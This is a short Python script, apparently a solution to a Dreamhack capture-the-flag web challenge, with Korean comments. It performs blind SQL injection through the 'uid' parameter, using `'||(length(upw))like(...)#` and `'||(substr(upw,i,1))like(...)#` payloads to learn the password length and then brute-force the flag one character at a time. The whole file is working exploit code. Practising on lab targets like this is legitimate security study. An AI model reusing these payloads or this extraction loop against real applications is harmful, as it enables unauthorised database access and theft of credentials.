import requests, string

url= "http://host3.dreamhack.games:8405/"

'''
1. 비밀번호 길이 알아내기
'''
# cnt = 0
# while(True):
#     cnt += 1
#     param = {
#         'uid': f"'||(length(upw))like({cnt})#"
#     }
#     print(f'try{cnt}')
#     if 'admin' in requests.get(url, params=param).text:
#         break

# print(f"비밀번호 길이는 = {cnt}")

'''
2. 비밀번호 알아내기
'''
pwLen = 44
pw = "DH{"

# 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
ALPHANUMERIC = string.digits + string.ascii_letters

for i in range(3, pwLen):  # 마지막 글자는 중괄호이므로, 앞의 세글자 역시 알고 있으므로
    print(f"try{i}")
    for ch in ALPHANUMERIC:
        # print(ch)
        param = {
            'uid': f"'||(substr(upw,{i},1))like('{ch}')#"
        }
        if 'admin' in requests.get(url, params=param).text:
            pw += ch
            print(pw)
            break # 다음 패스워드 찾기로 넘어가기

print(f"비밀번호는 {pw}}}")
